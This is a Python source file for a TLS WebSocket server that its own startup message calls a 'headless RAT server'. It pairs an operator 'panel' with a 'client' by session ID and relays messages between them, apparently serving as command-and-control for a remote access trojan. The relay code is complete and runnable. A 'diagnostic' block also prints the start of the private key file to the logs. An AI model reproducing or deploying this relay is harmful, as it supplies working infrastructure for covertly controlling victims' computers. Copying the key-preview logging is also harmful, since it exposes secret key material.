import asyncio
import websockets
import ssl
import pathlib
import json
import os

# The handler function remains the same
CONNECTED_PARTIES = {} 
async def handler(websocket, path):
    # ... (no changes in this function, keeping it for brevity)
    print(f"[*] New connection from {websocket.remote_address}")
    session_id, role = None, None
    try:
        data = json.loads(await websocket.recv())
        role, session_id = data.get("role"), data.get("session_id")
        if not role or not session_id: await websocket.close(1011, "Role/session_id required."); return
        if session_id not in CONNECTED_PARTIES: CONNECTED_PARTIES[session_id] = {"panel": None, "client": None}
        if role == "panel": CONNECTED_PARTIES[session_id]["panel"] = websocket; print(f"[*] Panel connected for session {session_id}")
        elif role == "client": CONNECTED_PARTIES[session_id]["client"] = websocket; print(f"[*] Client connected for session {session_id}")
        while True:
            message = await websocket.recv()
            session = CONNECTED_PARTIES.get(session_id, {})
            panel_ws, client_ws = session.get("panel"), session.get("client")
            if role == "panel" and client_ws: await client_ws.send(message)
            elif role == "client" and panel_ws: await panel_ws.send(message)
    except websockets.ConnectionClosed: print(f"[!] Connection for session {session_id} (role: {role}) closed.")
    finally:
        if session_id and session_id in CONNECTED_PARTIES:
            if role == "panel": CONNECTED_PARTIES[session_id]["panel"] = None
            if role == "client": CONNECTED_PARTIES[session_id]["client"] = None
            if not CONNECTED_PARTIES[session_id]["panel"] and not CONNECTED_PARTIES[session_id]["client"]:
                del CONNECTED_PARTIES[session_id]; print(f"[*] Session {session_id} removed.")

async def main():
    # --- NEW DIAGNOSTIC CODE ---
    print("\n" + "="*50)
    print("      STARTING DIAGNOSTIC CHECK")
    print("="*50)
    
    secret_path_str = "/etc/secrets/"
    cert_file_str = os.path.join(secret_path_str, "cert.pem")
    key_file_str = os.path.join(secret_path_str, "key.pem")

    print(f"[*] Checking for secrets directory: '{secret_path_str}'")
    if os.path.isdir(secret_path_str):
        print(f"  [SUCCESS] Directory exists.")
        try:
            files_in_dir = os.listdir(secret_path_str)
            print(f"  [*] Files found inside: {files_in_dir if files_in_dir else 'None'}")
            
            # Check cert.pem
            print(f"\n[*] Checking for cert file: '{cert_file_str}'")
            if os.path.isfile(cert_file_str):
                print("  [SUCCESS] cert.pem exists.")
                with open(cert_file_str, 'r') as f:
                    content_preview = f.read(30).strip()
                print(f"  [*] Content preview: '{content_preview}...', Size: {os.path.getsize(cert_file_str)} bytes")
            else:
                print("  [FAILURE] cert.pem does NOT exist or is not a file.")

            # Check key.pem
            print(f"\n[*] Checking for key file: '{key_file_str}'")
            if os.path.isfile(key_file_str):
                print("  [SUCCESS] key.pem exists.")
                with open(key_file_str, 'r') as f:
                    content_preview = f.read(30).strip()
                print(f"  [*] Content preview: '{content_preview}...', Size: {os.path.getsize(key_file_str)} bytes")
            else:
                print("  [FAILURE] key.pem does NOT exist or is not a file.")

        except Exception as e:
            print(f"  [ERROR] An exception occurred while inspecting the directory: {e}")
    else:
        print(f"  [FAILURE] Directory '{secret_path_str}' does NOT exist.")
        
    print("="*50)
    print("      DIAGNOSTIC CHECK COMPLETE")
    print("="*50 + "\n")
    # --- END DIAGNOSTIC CODE ---


    # Original server code
    secret_path = pathlib.Path("/etc/secrets/")
    certfile = secret_path / "cert.pem"
    keyfile = secret_path / "key.pem"

    try:
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(certfile, keyfile)
    except FileNotFoundError:
        print(f"[!!!] FATAL ERROR: Shutting down due to missing certificate files.")
        return # Exit cleanly

    host = "0.0.0.0"
    port = int(os.environ.get("PORT", 8765))
    
    print(f"[*] Starting headless RAT server on wss://{host}:{port}")
    async with websockets.serve(handler, host, port, ssl=ssl_context, max_size=None):
        await asyncio.Future()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[*] Server is shutting down.")